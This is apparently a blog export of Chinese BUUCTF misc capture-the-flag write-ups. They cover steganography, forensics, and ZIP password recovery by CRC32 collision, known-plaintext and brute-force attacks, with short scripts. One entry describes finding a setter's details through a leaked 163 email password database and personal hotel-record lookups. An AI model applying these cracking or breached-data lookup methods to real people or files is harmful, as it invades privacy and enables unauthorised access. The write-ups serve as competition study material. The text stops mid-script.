<h2 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h2><p>简单键盘密码</p>
<h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><p>用 <strong>Audacity</strong> 分析，一开始没发现东西，后来想到频谱图里下面有一行红线，猜测内容是被缩小了<br><img src="http://lychee.xibai.xyz/uploads/big/76cb90d64cea4819a299ffb5e0d70c8c.png" alt="red line"><br><img src="http://lychee.xibai.xyz/uploads/small/80cb0e34c72b40f2bd02068dab02af21.png" alt="zoom"><br>啊啊啊，我的眼睛！！！出题人让我逮到了有他好果子吃！<br><img src="http://lychee.xibai.xyz/uploads/small/165b86a4b0504df0e89f50c871a8b9c4.png" alt="hint"><br>两个数字的和，看来这个wav里面藏了其他东西，用wav相关的隐写工具先试一试，发现steghide解出了一个url，是腾讯微云的文件分享，下载下来，png的头部数据还错了，手动修复。<br><img src="http://lychee.xibai.xyz/uploads/small/38a63fd2cd703ade5e0349d981cd8c14.png" alt="flag"><br>转Unicode得到两个数字，相加即为flag</p>
<h2 id="HDCTF2019-你能发现什么蛛丝马迹吗"><a href="#HDCTF2019-你能发现什么蛛丝马迹吗" class="headerlink" title="[HDCTF2019]你能发现什么蛛丝马迹吗"></a>[HDCTF2019]你能发现什么蛛丝马迹吗</h2><p>volatility分析，这里注意查看镜像信息后直接用第一个<code>Win2003SP0x86</code>来进行其它的分析会出现无法识别各种东西的问题，换后面的镜像即可。<br>查看文件发现存在flag.png，dump出来是一个二维码，扫码拿到一串字符串，base64尝试无果，再次分析该文件发现尾部还有第二个文件。分离后得到<code>key</code>和<code>iv</code>，那应该是对称加密算法的一种，尝试后在<code>aes</code>的<code>ecb</code>模式下解得flag</p>
<h2 id="CTF2019-otaku"><a href="#CTF2019-otaku" class="headerlink" title="[*CTF2019]otaku"></a>[*CTF2019]otaku</h2><p>u1s1，去年我是怎么被*ctf的签到劝退的，记得当时签到死活提交不对。以为是个神仙比赛，这看来也是有简单题的，tnl555。题目文件是伪加密，解压是一个zip和doc，zip里有一个<code>last words.txt</code>和一段压缩设置的注释，doc里面有一段隐藏文字，很明显隐藏文字就是<code>last words</code>的内容。那应该就是明文攻击了，给了winrar的压缩方式，直接提取lastwords内容压一个包。<br>这里有个点，就是明文攻击要求内部的已知加密文件必须是一模一样的内容，压出来一个一样的包，想看打出来的包符合不符合要求可以用winrar打开看它们的crc校验码是否一样，校验码一样就可以直接攻击，不一样的话要先调整文件，调整到crc码一样才可以。<br>这里一开始打了个包发现crc并不一样，就查找问题，发现题目中的<code>lastwords.txt</code>是432byte，我们提取出来的txt是433byte，说明压缩算法暂时没问题，问题出在我们创建的txt上面了。打开txt查看我们提取的内容，总共是431个字符，但是大小是433byte，说明里面有一个字符不在ASCII码范围，故utf-8用了3个字节表示这个字符，而源文件432byte，应该是这个字符仅用了2byte。那就知道是什么问题了，将txt另存为ANSI或者GBK编码，再看就是432byte了，然后按照给出的压缩方式压缩，crc码一样，明文攻击得到压缩包密码。<br>解压缩得到flag.png，直接常规png隐写一条路，发现lsb隐藏了flag</p>
<h2 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h2><p>图片末尾有压缩包，解压得到aaencode，去掉最后一个<code>(&#39;_&#39;)</code>，然后复制到谷歌浏览器控制台里运行，可以看到解密后的代码，拿到flag</p>
<h2 id="ACTF新生赛2020-swp"><a href="#ACTF新生赛2020-swp" class="headerlink" title="[ACTF新生赛2020]swp"></a>[ACTF新生赛2020]swp</h2><p>看流量包能找到一个压缩包，提取出来需要密码，伪加密试一下得到两个flag文件，一个是<code>elf</code>，一个是<code>swp</code>。<code>swp</code>是<code>vim</code>编辑文件时候的备份文件，用于储存用户的修改信息。先查看一下<code>elf</code>没有恢复修改时候的内容，发现提示符号表错误，利用<code>swp</code>文件恢复原flag文件。之后利用IDA查看字符串即可看到flag</p>
<h2 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h2><p>大一点的jpg末尾有一个小压缩包，加密，无提示，爆破得到密码888866，拿到base64密文，解密后是<code>killerqueen</code>。<br>目测是密钥，第二张图没有多余信息，用常见的几个jpg隐写工具试一遍，<code>outguess</code>解出flag</p>
<h2 id="MRCTF2020-千层套路"><a href="#MRCTF2020-千层套路" class="headerlink" title="[MRCTF2020]千层套路"></a>[MRCTF2020]千层套路</h2><p>python写个脚本挂机解压一千次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">un_zip</span>(<span class="params">file_name</span>):</span></span><br><span class="line"> zip_file = zipfile.ZipFile(file_name)</span><br><span class="line"> name = zip_file.namelist()[<span class="number">0</span>]</span><br><span class="line"> zip_file.extract(name,<span class="string">&quot;./&quot;</span>,file_name[:<span class="number">4</span>].encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"> zip_file.close()</span><br><span class="line"> os.remove(file_name)</span><br><span class="line"> un_zip(name)</span><br><span class="line"></span><br><span class="line">un_zip(xxxxx)</span><br></pre></td></tr></table></figure>
<p>qr.txt，那就是二维码像素数据了，python转二维码加扫码一条龙</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">200</span>,<span class="number">200</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;qr.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pixels = []</span><br><span class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> f.readlines():</span><br><span class="line">        pixel.strip()</span><br><span class="line">        pixels.append(pixel)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">            img.putpixel((i,j),<span class="built_in">eval</span>(pixels[num]))</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = zxing.BarCodeReader()</span><br><span class="line">flag_str = flag.decode(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure>
<h2 id="WUSTCTF2020-爬"><a href="#WUSTCTF2020-爬" class="headerlink" title="[WUSTCTF2020]爬"></a>[WUSTCTF2020]爬</h2><p>查看文件十六进制，发现是pdf文件，改后缀打开，提示flag被文件压在下面了，用word打开，将<code>爬</code>图像图层移至最底层，看到flag图像，文字识别然后十六进制转ascii码</p>
<h2 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h2><p>是一段手机拨号音，直接<code>dtmf2num</code>工具提取对应按键：999<em>666</em>88<em>2</em>777<em>33</em>6<em>999</em>4<em>444</em>777<em>555</em>333<em>777</em>444<em>33</em>66<em>3</em>7777<br>很明显，手机九建密码，十年前那种拨号键输入的手机也就是现在的老年机的打字方式。按一遍得到flag</p>
<h2 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h2><p>根据程序提示，修改系统时间到赛博朋克2077发售日即可</p>
<h2 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h2><p>base64,栅栏，凯撒。<br>栅栏密码为7，用加密<br>最后flag开头为’xman’</p>
<h2 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h2><p>winhex搜索CTF得到flag</p>
<h2 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h2><h3 id="熟练的赛棍"><a href="#熟练的赛棍" class="headerlink" title="熟练的赛棍"></a>熟练的赛棍</h3><p>上自动化工具！<br>使用<code>montage</code>和<code>gaps</code></p>
<blockquote>
<p>montage *jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg<br>gaps —image=flag.jpg —generations=40 —population=120 —size=100</p>
</blockquote>
<h3 id="笨鸟先飞"><a href="#笨鸟先飞" class="headerlink" title="笨鸟先飞"></a>笨鸟先飞</h3><p>120张图，12*10或者8*15，就硬拼，估计也要不了太长时间</p>
<h2 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h2><p>解压docx文档，在图片资源文件夹看见flag图片</p>
<h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p><code>Stegsolve</code>进行<code>lsb隐写</code>分析得到<code>hint.png</code>，红色图片末尾有加密压缩包，解压得到一个txt,里面全是<code>127</code>,<code>255</code>,<code>63</code>,<code>191</code><br>写个脚本解码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;in.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            o.write(<span class="built_in">bin</span>(<span class="built_in">eval</span>(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;in.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]))</span><br></pre></td></tr></table></figure>
<p>得到<code>flag.rar</code>的密码，解压后发现里面的压缩包是<code>doc文档</code>，word打开，全选设置黑色，文档下面有几行base64编码<br>解码后会发现是一堆01，隐约能看出明文，脚本处理一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;&#x27;&#x27;MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span></span><br><span class="line"><span class="string">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span></span><br><span class="line"><span class="string">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="string">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="string">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="string">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = a.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(i).replace(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27; &#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h2><p>wav文件末尾是一个openssl加密的密文，png文件末尾有压缩包，解压得到密钥，在线网站aes解密拿到明文key，然后silenteye提取wav里的flag</p>
<h2 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h2><p>流量包，两条流量，第一条是终端的输入输出<br>第二条是压缩包。提取压缩包用第一条中的密码解压即可</p>
<h2 id="ACTF新生赛2020-明文攻击"><a href="#ACTF新生赛2020-明文攻击" class="headerlink" title="[ACTF新生赛2020]明文攻击"></a>[ACTF新生赛2020]明文攻击</h2><p>图片末尾一个破坏了文件头的zip，修复一下，可以发现该zip中的flag.txt内容与加密压缩包中的一致，明文攻击解密即可</p>
<h2 id="UTCTF2020-file-header"><a href="#UTCTF2020-file-header" class="headerlink" title="[UTCTF2020]file header"></a>[UTCTF2020]file header</h2><p>png文件头修复即可</p>
<h2 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h2><p>三个空格代表0，六个代表1，替换一下转ASCII</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        i = i.strip()</span><br><span class="line">        a += i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(a[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>)]))</span><br></pre></td></tr></table></figure>
<h2 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h2><p>文件错误，winhex查看，在末尾发现大量的<code>A1</code>，猜测文件和<code>A1</code>进行了异或，解一下异或，然后就能听到flag了</p>
<h2 id="UTCTF2020-basic-forensics"><a href="#UTCTF2020-basic-forensics" class="headerlink" title="[UTCTF2020]basic-forensics"></a>[UTCTF2020]basic-forensics</h2><p>后缀名改txt，搜索flag</p>
<h2 id="SCTF2019-电单车"><a href="#SCTF2019-电单车" class="headerlink" title="[SCTF2019]电单车"></a>[SCTF2019]电单车</h2><p>本题需要查看原题描述。搜索网络记录得知，原题描述为：</p>
<blockquote>
<p>截获了一台电动车的钥匙发射出的锁车信号，3分钟之内，我要获得它地址位的全部信息。flag内容二进制表示即可</p>
</blockquote>
<p>可知本题考察无线电知识，一番搜索之后找到一篇遥控器无线电信号的分析文章用来参考，地址如下：<br><a href="https://www.freebuf.com/articles/wireless/191534.html">https://www.freebuf.com/articles/wireless/191534.html</a></p>
<p>结合文章中的信号分析图，对本题无线电信号做一个二进制转换即可</p>
<h2 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h2><p>零宽字符隐写，上工具:<br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<h2 id="湖南省赛2019-Findme"><a href="#湖南省赛2019-Findme" class="headerlink" title="[湖南省赛2019]Findme"></a>[湖南省赛2019]Findme</h2><p>五个png，第一张，利用crc爆破原图像宽高：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        a = <span class="string">b&#x27;\x49\x48\x44\x52&#x27;</span> + <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(w)[<span class="number">2</span>:].zfill(<span class="number">8</span>)) + <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(h)[<span class="number">2</span>:].zfill(<span class="number">8</span>)) + <span class="string">b&#x27;\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> zlib.crc32(a) == <span class="number">0x00000033</span>:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<p>然后利用<code>pngcheck</code>修复另外两处<code>IDAT</code>块的格式错误，修复后。在<code>1.png</code>的<code>blue 2</code>色道下看到二维码，扫码得part1</p>
<p><code>2.png</code>末尾有一个<code>7z</code>标识得压缩包，提取出来观察发现其实是<code>zip</code>压缩包，将<code>7z</code>全部替换为<code>PK</code>即可解压缩，然后按大小排序拿到part2</p>
<p><code>3.png</code>在修复<code>IDAT</code>块末尾得<code>crc32</code>校验码时可以发现所有错误的校验码都刚好是一个可见ASCII码字符，提取出来得到part3</p>
<p><code>4.png</code>末尾有part4</p>
<p><code>5.png</code>末尾有part5，将五部分字符串拼接解base64即可。拼接顺序尝试一下就知道了，反正开头结尾都知道，中间三个也就六种可能</p>
<h2 id="QCTF2018-X-man-A-face"><a href="#QCTF2018-X-man-A-face" class="headerlink" title="[QCTF2018]X-man-A face"></a>[QCTF2018]X-man-A face</h2><p>二维码标识符修复，然后解base32</p>
<h2 id="ACTF新生赛2020-剑龙"><a href="#ACTF新生赛2020-剑龙" class="headerlink" title="[ACTF新生赛2020]剑龙"></a>[ACTF新生赛2020]剑龙</h2><h3 id="不正经解"><a href="#不正经解" class="headerlink" title="不正经解"></a>不正经解</h3><p>O_O用winhex查看发现是pyc，结合题目名字盲猜Stegosaurus隐写<br>注：如果该工具运行报错，恭喜你，可以重新配一遍python环境了（不是强迫症就算了，笔者有点强迫症，无法忍受自己的环境有小毛病）<br>注二：报错但也不想配环境，下载一个大蟒蛇吧</p>
<h3 id="正经解aa"><a href="#正经解aa" class="headerlink" title="正经解aa"></a>正经解aa</h3><p>题目给了一个hint压缩包，里面有一个<code>hh.jpg</code>和<code>pwd.txt</code>，pwd是aaencode，找个在线网站解密一下是<code>welcom3!;</code>，明显是jpg要用到的，jpg的隐写方式无非就那几种，猜不出来是什么就全试一遍，试到<code>steghide</code>拿到隐藏txt，后面一个<code>openssl</code>加密过的密文，找一下发现<code>hh.jpg</code>的文件信息给了密钥，解密一下得到提示<code>Stegosaurus</code>，然后就是不正经解的内容了。</p>
<h2 id="请移步篇章四"><a href="#请移步篇章四" class="headerlink" title="请移步篇章四"></a><a href="http://xibai.xyz/2021/04/19/BUU-Misc-four/">请移步篇章四</a></h2><h2 id="也可移步篇章二"><a href="#也可移步篇章二" class="headerlink" title="也可移步篇章二"></a><a href="http://xibai.xyz/2020/02/02/BUU-Misc-two/">也可移步篇章二</a></h2>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-MISC(二)</title>
    <url>/2020/02/02/BUU-Misc-two/</url>
    <content><![CDATA[<p><strong>最近更新：</strong> <em>2020-02-16 18:10</em></p>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>解压出来68个压缩包，还全是带真密码的，还没提示！！！我丢。不过查看压缩包发现每一个压缩包内部的文件数据都只有4byte，这情况，感觉是要爆破每一个文件的节奏。百度了一手，发现还真是爆破emmm，这个是 <strong>利用crc校验码进行加密文件内容爆破，因为即便是加密压缩包，猜测为了可以不查看加密数据而获知数据的准确性所以压缩包是保存有压缩前数据的哈希值</strong> 。遇到这种小数据加密压缩包，在计算力足够的情况下，就可以采取哈希碰撞的爆破方法来爆破加密数据（<strong>前提是数据长度在其所用的哈希算法中可以确保该长度每一个哈希值和其对应的数据都是双射的</strong>）。写个脚本咯：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + k + h</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">&#x27;out&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">        crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>+<span class="string">&quot;进度：&#123;:%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">float</span>((i+<span class="number">1</span>)/<span class="number">68</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nCRC32碰撞开始&quot;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CRC32碰撞完成&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>然后发现base64解码又是文件，因为不注意造轮子，这种脚本遇见一次写一次，丢，我再写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str123 = <span class="string">&quot;z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==&quot;</span></span><br><span class="line"></span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">str123 = base64.b64decode(str123)</span><br><span class="line">fi.write(str123)</span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
<p>好了拿到最终压缩包，但是这个文件头emmm，没见过，百度。好吧，rar的文件头删了七个字节，手动加上，解压缩报错文件头错误，百度rar文件头部数据，行吧，文件头中第 <code>0x16</code> 字节应该是固定74，这里是7A，改了之后再次解压缩，报错文件CMT头损坏，回头再研究，这里已经解压出来了包中的 <code>flag.txt</code> 和 <code>CMT</code> ，记事本打开cmt看到flag</p>
<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>压缩包有密码，题目弱口令，懂了，是时候把我珍藏多年的<del>小黄书</del>小黄本掏出来了。我Ubuntu19都装好了，软件和内核都更新了一遍了，这emmm还没跑出来。。。<br>打开康康，有注释emmm，ctrl a了一下发现全是空白，<del>我还以为压缩包注释也能把字设成白色了呢</del>。仔细看发现，有 <code>space</code> 有 <code>\t</code>,而且每一行二者数量都不超过5个，懂了！摩斯电码，丢，手动转码后拿到压缩包密码，解压缩是一个 <code>女神.png</code> ，这套路我熟（滑稽脸），带加密算法的lsb，弱口令想必就是在这里。该lsb加密算法地址<a href="https://github.com/cyberinc/cloacked-pixel">https://github.com/cyberinc/cloacked-pixel</a>。<br>盲猜密码123456，过了</p>
<h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>和秘密文件一样，ftp流量看到压缩包，提取压缩包，爆破密码</p>
<h2 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h2><p>分析数据包，发现ftp数据条目后面有ctf字眼，跟踪流量，发现完整过程，hacker下载了一个rar压缩包，跟踪TCP流量找到传输压缩包那一条，把压缩包保存出来，有密码emm，开个后台爆破，然后前台手工找。<br>我丢，我人眼扫了整个流量包没找密码，然后突然看到我挂在后台的爆破程序老早就停了，密码四位数字：1903，解压拿flag</p>
<h2 id="寂静之城"><a href="#寂静之城" class="headerlink" title="寂静之城"></a>寂静之城</h2><p>我丢内类目熬。16年初的社工题，我差点没把这个网页所有数据全人眼扫一遍，最后搜了wp才知道这是16年年初的社工题，能在收藏里面找到出题人信息，丢，回应转发点赞收藏四个条目，我差点没把眼睛审没了emmm，找到之后点开查看信息，有163邮箱，一串aes或者des加密的密文，还有密钥的提示，163被脱库了，邮箱密码就是密钥。。。<br>这emmmm，隔了四年的社工题，以前没接触过社工库类的社工题，被迫百度，得到密码，解出来一个微博链接，年代久远，网页已丢，得了，直接看wp看完吧。。。<br>    出题人姓名DJ，但是已经没有微博了。。。。。去找了原来题目的wp，看了下，原来是去查开房记录。。。。。现在好了，flag就在眼前了，现在已经有了密钥，还差身份证号码了，知道了出题人的名字，和开房时间，果断去查开房记录啊！为了出这道题我也是拼了啊！不过不是我的身份证号。同名的而已</p>
<h2 id="谁赢了比赛"><a href="#谁赢了比赛" class="headerlink" title="谁赢了比赛"></a>谁赢了比赛</h2><p>winhex在结尾发现rar压缩包，提取出来，先挂上后台爆破，然后密码就出来了，1020，拿到一张动态图和txt，txt没用，分离动态图，第310张是白图，点开发下右下角有小字让猜flag，<code>stegsolve</code>打开换色道，发现二维码，扫码得flag</p>
<h2 id="蜘蛛侠鸭"><a href="#蜘蛛侠鸭" class="headerlink" title="蜘蛛侠鸭"></a>蜘蛛侠鸭</h2><p>在流量包中发现大量ICMP流量，仔细查看发现每条数据后都跟有 <code>$$START$$xxxxx</code>的内容，且第一条含有 <strong>begin</strong> ，最后一条有 <strong>end</strong> ，把begin后的第一条流量中start后的字符解一下base64，发现是压缩包开头，ok，找到关键数据，写个脚本提取所有的base字符串（<strong>注意，有大量重复的数据，第一次写的脚本没考虑到结果提取出来的数据转回压缩包老是报错emmm</strong>），然后转回压缩包。解压得到一张奇怪的动态图。<br>这里看动态图感觉每一帧的时间怪怪的，在 <code>CTF Wiki</code> 里看到gif可以进行时间相关的隐写————利用每一帧的时间间隔。  kali下用 <code>identify</code> 的命令可以清晰提取出每一帧后的时间间隔<br> identify -format “%s %T\n” flag.gif<br>本题所提取的时间间隔只要 <strong>20</strong> 和 <strong>50</strong> ，推测是二进制，用 <code>0</code> 代替 <code>20</code> ，<code>1</code> 代替 <code>50</code>，然后二进制ASCII转字符串，得到关键信息 <code>mD5_1t</code> ,32位md5即为flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_FileSize</span>(<span class="params">filePath</span>):</span></span><br><span class="line">    fsize = os.path.getsize(filePath)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(fsize, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.pcap&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    fisize = get_FileSize(os.getcwd()+<span 